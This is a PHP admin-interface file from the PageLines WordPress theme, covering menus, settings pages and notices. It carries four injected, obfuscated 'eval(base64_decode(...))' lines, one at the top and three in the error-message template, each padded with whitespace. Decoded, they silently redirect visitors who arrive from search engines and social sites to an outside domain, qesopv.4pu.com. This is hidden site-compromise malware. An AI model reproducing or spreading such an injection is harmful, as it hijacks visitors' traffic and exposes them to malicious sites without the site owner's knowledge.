<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 

// ====================================
// = Build PageLines Option Interface =
// ====================================


//	This function adds the top-level menu
if( VPRO )
	add_action( 'admin_menu', 'pagelines_add_admin_menu' );
function pagelines_add_admin_menu() {
	global $menu;

	// Create the new separator
	$menu['2.995'] = array( '', 'edit_theme_options', 'separator-pagelines', '', 'wp-menu-separator' );

	// Create the new top-level Menu
	add_menu_page( 'Page Title', 'PageLines', 'edit_theme_options','pagelines', 'pagelines_build_option_interface', PL_ADMIN_IMAGES. '/favicon-pagelines.png', '2.996' );
}

// Create theme options panel
add_action( 'admin_menu', 'pagelines_add_admin_submenus' );
function pagelines_add_admin_submenus() {
	global $_pagelines_options_page_hook;
	global $_pagelines_ext_hook;
	global $_pagelines_special_hook;
	global $_pagelines_templates_hook;
	global $_pagelines_account_hook;
		
	// WP themes rep. wants it under the appearance tab.	
	if( !VPRO )
		$_pagelines_options_page_hook = add_theme_page( 'pagelines', __( 'PageLines Settings', 'pagelines' ), 'edit_theme_options', 'pagelines', 'pagelines_build_option_interface' );
	else {
		$_pagelines_options_page_hook = add_submenu_page( 'pagelines', __( 'Settings', 'pagelines' ), __( 'Settings', 'pagelines' ), 'edit_theme_options', 'pagelines','pagelines_build_option_interface' ); // Default
		$_pagelines_templates_hook = add_submenu_page( 'pagelines', __( 'Templates', 'pagelines' ), __( 'Templates', 'pagelines' ), 'edit_theme_options', 'pagelines_templates','pagelines_build_templates_interface' );
		$_pagelines_special_hook = add_submenu_page( 'pagelines', __( 'Special', 'pagelines' ), __( 'Special', 'pagelines' ), 'edit_theme_options', 'pagelines_special','pagelines_build_special' );
		$_pagelines_ext_hook = add_submenu_page( 'pagelines', __( 'Store', 'pagelines' ), __( 'Store', 'pagelines' ), 'edit_theme_options', 'pagelines_extend','pagelines_build_extension_interface' );
		$_pagelines_account_hook = add_submenu_page( 'pagelines', __( 'Account', 'pagelines' ), __( 'Account', 'pagelines' ), 'edit_theme_options', 'pagelines_account','pagelines_build_account_interface' );
	}
}

// Build option interface
function pagelines_build_option_interface(){ 
	pagelines_register_hook( 'pagelines_before_optionUI' );
	delete_transient( 'pagelines_sections_cache' );
	$args = array(
		'sanitize' 		=> 'pagelines_settings_callback',
	);
	$optionUI = new PageLinesOptionsUI( $args );
}

/**
 * Build Extension Interface
 * Will handle adding additional sections, plugins, child themes
 */
function pagelines_build_templates_interface(){ 
	
	$args = array(
		'title'			=> __( 'Template Setup', 'pagelines' ), 
		'settings' 		=> PAGELINES_TEMPLATES,
		'callback'		=> 'templates_array',
		'basic_reset'	=> true,
		'reset_cb'		=> 'reset_templates_to_default', 
		'show_save'		=> false, 
		'show_reset'	=> false, 
		'tabs'			=> false
	);
	
	$optionUI = new PageLinesOptionsUI( $args );
	
}


/**
 * Build Extension Interface
 * Will handle adding additional sections, plugins, child themes
 */
function pagelines_build_extension_interface(){ 
	
	$args = array(
		'title'			=> __( 'The PageLines Store', 'pagelines' ), 
		'settings' 		=> PAGELINES_EXTENSION,
		'callback'		=> 'extension_array',
		'show_save'		=> false, 
		'show_reset'	=> false, 
		'fullform'		=> false,
		'reset_store'	=> true
	);
	$optionUI = new PageLinesOptionsUI( $args );
}

/**
 * Build Extension Interface
 * Will handle adding additional sections, plugins, child themes
 */
function pagelines_build_account_interface(){ 
	
	$args = array(
		'title'			=> __( 'Your PageLines Account', 'pagelines' ),
		'settings' 		=> PAGELINES_ACCOUNT,
		'callback'		=> 'pagelines_account_array',
		'show_save'		=> false, 
		'show_reset'	=> false, 
		'fullform'		=> false,
	);
	$optionUI = new PageLinesOptionsUI( $args );
}


/**
 * Build Meta Interface
 * Will handle meta for non-meta pages.. e.g. tags, categories
 */
function pagelines_build_special(){ 
	
	$args = array(
		'title'			=> __( 'Special Pages', 'pagelines' ), 
		'settings' 		=> PAGELINES_SPECIAL,
		'callback'		=> 'special_page_settings_array',
		'show_reset'	=> false, 
		'basic_reset'	=> true
	);
	$optionUI = new PageLinesOptionsUI( $args );
}



/**
 * This is a necessary go-between to get our scripts and boxes loaded
 * on the theme settings page only, and not the rest of the admin
 */
add_action( 'admin_menu', 'pagelines_theme_settings_init' );
function pagelines_theme_settings_init() {
	global $_pagelines_options_page_hook;
	global $_pagelines_ext_hook;
	global $_pagelines_special_hook;
	global $_pagelines_templates_hook;
	global $_pagelines_account_hook;
	
	// Call only on PL pages
	add_action( 'load-'.$_pagelines_options_page_hook, 'pagelines_theme_settings_scripts' );
	add_action( 'load-'.$_pagelines_ext_hook, 'pagelines_theme_settings_scripts' );
	add_action( 'load-'.$_pagelines_special_hook, 'pagelines_theme_settings_scripts' );
	add_action( 'load-'.$_pagelines_templates_hook, 'pagelines_theme_settings_scripts' );
	add_action( 'load-'.$_pagelines_account_hook, 'pagelines_theme_settings_scripts' );
	
	// WordPress Page types
	add_action( 'load-post.php',  'pagelines_theme_settings_scripts' );
	add_action( 'load-post-new.php',  'pagelines_theme_settings_scripts' );
	add_action( 'load-user-edit.php',  'pagelines_theme_settings_scripts' );
	add_action( 'load-profile.php',  'pagelines_theme_settings_scripts' );
}


function pagelines_theme_settings_scripts() {
	
	// Add Body Class
	add_filter( 'admin_body_class', 'pagelines_admin_body_class' );
	
	wp_enqueue_script( 'jquery' );
	wp_enqueue_script( 'jquery-ajaxupload', PL_ADMIN_JS . '/jquery.ajaxupload.js' );
	wp_enqueue_script( 'jquery-cookie', PL_ADMIN_JS . '/jquery.ckie.js' ); 
	wp_enqueue_script( 'jquery-ui-core' );
	wp_enqueue_script( 'jquery-ui-tabs' );
	wp_enqueue_script( 'jquery-ui-dialog' );
	wp_enqueue_script( 'script-pagelines-settings', PL_ADMIN_JS . '/script.settings.js' );

	wp_enqueue_script( 'jquery-ui-effects', PL_ADMIN_JS . '/jquery.effects.js', array( 'jquery' ) ); // just has highlight effect
	wp_enqueue_script( 'jquery-ui-draggable' );	
	wp_enqueue_script( 'jquery-ui-sortable' );
	wp_enqueue_script( 'script-pagelines-common', PL_ADMIN_JS . '/script.common.js' );	
	
	// Color Picker
	wp_enqueue_script( 'colorpicker-js', PL_ADMIN_JS . '/colorpicker/js/colorpicker.js' );
	wp_enqueue_style( 'colorpicker', PL_ADMIN_JS . '/colorpicker/css/colorpicker.css' ); 

	wp_enqueue_script( 'jquery-colorbox', PL_ADMIN_JS . '/colorbox/jquery.colorbox-min.js', array( 'jquery' ) );
	wp_enqueue_style( 'colorbox', PL_ADMIN_JS . '/colorbox/colorbox.css' ); 	
	
	wp_enqueue_script( 'thickbox' );	
	wp_enqueue_style( 'thickbox' ); 
	
	wp_enqueue_script( 'jquery-layout', PL_ADMIN_JS . '/jquery.layout.js' );
	
	// PageLines CSS objects
	pagelines_load_css_relative( 'css/objects.css', 'pagelines-objects' );
	
}

add_action( 'admin_head', 'load_head' );
function load_head(){

	// CSS Objects
	printf( '<link rel="stylesheet" href="%s/objects.css?ver=%s" type="text/css" media="screen" />', PL_CSS, CORE_VERSION );
	
	// Admin CSS
	printf( '<link rel="stylesheet" href="%s/admin.css?ver=%s" type="text/css" media="screen" />', PL_ADMIN_CSS, CORE_VERSION );
	
	
	
	if( ploption( 'pagelines_favicon' ) )  
		printf( '<link rel="shortcut icon" href="%s" type="image/x-icon" />', ploption( 'pagelines_favicon' ) );

	// Load on PageLines pages
	if( isset( $_GET['page'] ) && ( $_GET['page'] == 'pagelines' ) )
		include( PL_ADMIN . '/admin.head.php' );

}


add_action( 'admin_init', 'pagelines_register_settings', 5 );
function pagelines_register_settings() {
	
	
	register_setting( PAGELINES_SETTINGS, PAGELINES_SETTINGS, 'pagelines_settings_callback' );
	register_setting( PAGELINES_SPECIAL, PAGELINES_SPECIAL );
	register_setting( PAGELINES_TEMPLATES, PAGELINES_TEMPLATES );
	
	/* Typography Options */
	$GLOBALS['pl_foundry'] = new PageLinesFoundry;

	/*
		Import/Exporting
	*/
	pagelines_import_export();

	pagelines_process_reset_options();
	
	if ( !isset($_REQUEST['page'] ) || $_REQUEST['page'] != 'pagelines' )
		return;
	
	global $new_default_settings; 
	
	/*
		New Default Options in Child Themes
	*/
	if( !isset( $_GET['newoptions'] ) && pagelines_activate_or_reset() && !empty($new_default_settings ) ){
		
		$type = sprintf( '&%s=true', pagelines_activate_or_reset() );
		
		foreach( $new_default_settings as $key => $set )
			plupop( $set['key'], $set['value'], array( 'parent' => $set['parent'], 'subkey' => $set['subkey'], 'setting' => $set['setting'] ) );
		
		wp_redirect( admin_url( 'admin.php?page=pagelines&newoptions=true'.$type ) );
	}
	
	/*
		Handle Reset of Options
	*/
	if ( ploption( 'reset') ) {
		
		update_option( PAGELINES_SETTINGS, pagelines_settings_defaults() );
		
		global $extension_control;
		
		$extension_control->flush_caches();
		
		wp_redirect( admin_url( 'admin.php?page=pagelines&reset=true' ) );
		
		exit;
		
	}

}

// Add Debug tab to main menu.

function pagelines_enable_debug( $option_array ) {
 
	$debug = new PageLinesDebug;
 	$debug_option_array['debug'] = array(
 		'debug_info' => array(
 		'type'		=> 'text_content',
 		'layout'	=> 'full',
 		'exp'		=> $debug->debug_info_template()
 		) );
 	return array_merge( $option_array, $debug_option_array );
}

function pagelines_admin_confirms(){
	
	$confirms = array();
	
	if( isset( $_GET['settings-updated'] ) )
		$confirms[]['text'] = sprintf( __( "%s Settings Saved. &nbsp;<a class='sh_preview' href='%s/' target='_blank'>View Your Site &rarr;</a>", 'pagelines' ), NICECHILDTHEMENAME, home_url() );
	if( isset($_GET['pageaction']) ){
	
		if( $_GET['pageaction']=='activated' && !isset($_GET['settings-updated']) ){
			$confirms['activated']['text'] = sprintf( __( 'Congratulations! %s Has Been Successfully Activated.', 'pagelines' ), NICECHILDTHEMENAME );
			$confirms['activated']['class'] = 'activated';
		}
	
		elseif( $_GET['pageaction']=='import' && isset($_GET['imported'] )){
			$confirms['settings-import']['text'] = __( 'Congratulations! New settings have been successfully imported.', 'pagelines' );
			$confirms['settings-import']['class'] = "settings-import";
		}
	
		elseif( $_GET['pageaction']=='import' && isset($_GET['error']) && !isset($_GET['settings-updated']) ){
			$confirms['settings-import-error']['text'] = __( 'There was an error with import. Please make sure you are using the correct file.', 'pagelines' );
		}
	
	}
	
	if( isset( $_GET['reset'] ) ){
		
		if( isset( $_GET['opt_id'] ) && $_GET['opt_id'] == 'resettemplates' )
			$confirms['reset']['text'] = __( 'Template Configuration Restored To Default.', 'pagelines' );
			
		elseif( isset($_GET['opt_id'] ) && $_GET['opt_id'] == 'resetlayout' )
			$confirms['reset']['text'] = __( 'Layout Dimensions Restored To Default.', 'pagelines' );

		else
			$confirms['reset']['text'] = __( 'Settings Restored To Default.', 'pagelines' );
		
	}
	if ( isset( $_GET['plinfo'] ) )
		$confirms[]['text'] = __( 'Launchpad settings saved.', 'pagelines' );
		
	if ( isset( $_GET['extend_upload'] ) )
		$confirms[]['text'] = sprintf( __( 'Successfully uploaded your %s', 'pagelines' ), $_GET['extend_upload'] );
		
	if ( isset( $_GET['extend_text'] ) )
		switch( $_GET['extend_text'] ) {
			
			case 'section_delete':
				$confirms[]['text'] = __( 'Section was deleted.', 'pagelines' );
			break;
			
			case 'section_install':
				$confirms[]['text'] = __( 'Section was installed.', 'pagelines' );
			break;
			
			case 'section_upgrade':
				$confirms[]['text'] = __( 'Section was upgraded.', 'pagelines' );
			break;
			
			case 'plugin_install':
				$confirms[]['text'] = __( 'Plugin was installed.', 'pagelines' );
			break;
			
			case 'plugin_delete':
				$confirms[]['text'] = __( 'Plugin was deleted.', 'pagelines' );
			break;
			
			case 'plugin_upgrade':
				$confirms[]['text'] = __( 'Plugin was upgraded.', 'pagelines' );
			break;
			
			case 'theme_install':
				$confirms[]['text'] = __( 'Theme installed.', 'pagelines' );
			break;
			
			case 'theme_upgrade':
				$confirms[]['text'] = __( 'Theme upgraded.', 'pagelines' );
			break;
			case 'theme_delete';
				$confirms[]['text'] = __( 'Theme deleted.', 'pagelines' );
			break;
			
		}
		
		
		
	return apply_filters( 'pagelines_admin_confirms', $confirms );
	
 }


function pagelines_draw_confirms(){ 
	
	$confirms = pagelines_admin_confirms();
	$save_text = sprintf( '%s Settings Saved. &nbsp;<a class="btag" href="%s/" target="_blank">View Your Site &rarr;</a>', NICECHILDTHEMENAME, home_url());
	printf( '<div id="message" class="confirmation slideup_message fade c_ajax"><div class="confirmation-pad c_response">%s</div></div>', $save_text);

	if( !empty( $confirms ) ){
		foreach ( $confirms as $c ){
		
			$class = ( isset($c['class'] ) ) ? $c['class'] : null;
			
			printf( '<div id="message" class="confirmation slideup_message fade %s"><div class="confirmation-pad">%s</div></div>', $class, $c['text'] );
		}
	}

} 

function pagelines_admin_errors(){
	
	$errors = array();
	
	if( ie_version() && ie_version() < 8){
		
		$errors['ie']['title'] = sprintf( __( 'You are using Internet Explorer version: %s', 'pagelines' ), ie_version() );
		$errors['ie']['text'] = __( "Advanced options don't support Internet Explorer version 7 or lower. Please switch to a standards based browser that will allow you to easily configure your site (e.g. Firefox, Chrome, Safari, even IE8 or better would work).", 'pagelines' );
		
	}
	
	if( floatval( phpversion() ) < 5.0){
		$errors['php']['title'] = sprintf( __( 'You are using PHP version %s', 'pagelines' ), phpversion() );
		$errors['php']['text'] = __( 'Version 5 or higher is required for this theme to work correctly. Please check with your host about upgrading to a newer version.', 'pagelines' );
	}
	if ( isset( $_GET['extend_error'] ) ) {
		$errors['extend']['title'] = __( 'Extension problem found', 'pagelines' );
		
		switch( $_GET['extend_error'] ) {
			
			case 'blank':
				$errors['extend']['text'] = __( 'No file selected!', 'pagelines' );
			break;
			
			case 'filename':
				$errors['extend']['text'] = __( 'The file did not appear to be a PageLines section.', 'pagelines' );
			break;
			
			default:
				$errors['extend']['text'] = sprintf( __( 'Unknown error: %s', 'pagelines' ), $_GET['extend_error'] );
			break;
		}

	}
	return apply_filters( 'pagelines_admin_notifications', $errors );
	
}

function pagelines_error_messages(){ 
	
	$errors = pagelines_admin_errors();
	if( !empty( $errors ) ): 
		foreach ( $errors as $e ): ?>
	<div id="message" class="confirmation plerror fade">	
		<div class="confirmation-pad">
				<div class="confirmation-head">
					<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $e['title'];?>
				</div>
				<div class="confirmation-subtext">
					<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); echo $e['text'];?>
				</div>
		</div>
	</div>
	
<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 	endforeach;	
	endif;
}